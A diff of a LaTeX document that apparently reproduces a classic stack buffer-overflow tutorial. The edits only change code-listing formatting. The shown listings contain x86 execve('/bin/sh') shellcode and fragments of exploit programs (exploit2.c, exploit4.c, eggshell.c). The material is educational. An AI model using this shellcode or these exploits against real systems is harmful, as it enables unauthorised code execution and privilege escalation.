@@ -824,7 +824,8 @@ End of assembler dump.
 \end{verbatim}
 }
 
-\begin{lstlisting}[basicstyle=\tiny,caption=testsc.c]
+%\begin{lstlisting}[basicstyle=\tiny,caption=testsc.c]
+\begin{lstlisting}[caption=testsc.c,frame=single,frameround=tttt,breaklines=true]
 char shellcode[] =
 "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
 "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
@@ -903,7 +904,7 @@ __asm__("
 
 And our new test program: testsc2.c 
 
-\begin{lstlisting}[caption=testsc2.c,basicstyle=\tiny]
+\begin{lstlisting}[caption=testsc2.c,frame=single,frameround=tttt,breaklines=true]
 char shellcode[] =
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
@@ -931,8 +932,7 @@ we'll use to overflow the buffer. We know we must point the return address back 
 will demonstrate these points:
 
 %overflow1.c 
-\begin{lstlisting}[caption=overflow1.c,basicstyle=\tiny]
-
+\begin{lstlisting}[caption=overflow1.c,frame=single,frameround=tttt,breaklines=true]
 char shellcode[] =
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
@@ -1005,7 +1005,7 @@ We can create a program that takes as a parameter a buffer size, and an offset f
 (where we believe the buffer we want to overflow may live). We'll put the overflow string in an environment variable 
 so it is easy to manipulate: 
 
-\begin{lstlisting}[caption=exploit2.c,basicstyle=\tiny]
+\begin{lstlisting}[caption=exploit2.c,frame=single,frameround=tttt,breaklines=true]
 #include <stdlib.h>
 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
@@ -1014,8 +1014,6 @@ char shellcode[] =
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";
-\end{lstlisting}
-\begin{lstlisting}
 unsigned long get_sp(void) 
 {
    __asm__("movl %esp,%eax");
@@ -1254,7 +1252,6 @@ Our new program will take an extra variable, the size of the variable containing
 new exploit now looks like this:
 
 \begin{lstlisting}[caption=exploit4.c]
-
 #include <stdlib.h>
 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
@@ -1457,15 +1454,14 @@ ta      %l5 + 1
 
 %shellcode.h
 
-\begin{lstlisting}[caption=shellcode.h]
+%\begin{lstlisting}[caption=shellcode.h]
+\begin{lstlisting}[caption=shellcode.h,frame=single,frameround=tttt,breaklines=true]
 #if defined(__i386__) && defined(__linux__)
 #define NOP_SIZE        1
 char nop[] = "\x90";
 char shellcode[] =
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88"
-  "\x46\x07\x89\x46\x0c\xb0\x0b"
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
-  "\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 unsigned long get_sp(void) 
@@ -1473,8 +1469,7 @@ unsigned long get_sp(void)
    __asm__("movl %esp,%eax");
 }
 
-#elif defined(__sparc__) && defined(__sun__) && \
-        defined(__svr4__)
+#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
 
 #define NOP_SIZE        4
 
@@ -1518,15 +1513,16 @@ unsigned long get_sp(void)
 \end{lstlisting}
 
 %eggshell.c
-\begin{lstlisting}[caption=eggshell.c]
+%\begin{lstlisting}[caption=eggshell.c,frame=single,frameround=tttt,numbers=left,breaklines=true]
+\begin{lstlisting}[caption=eggshell.c,frame=single,frameround=tttt,breaklines=true]
 /*
  * eggshell v1.0
  *
  * Aleph One / aleph1@underground.org
  */
 
-#include 
-#include stdio.h
+#include <stdlib.h>
+#include <stdio.h>
 #include "shellcode.h"
 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
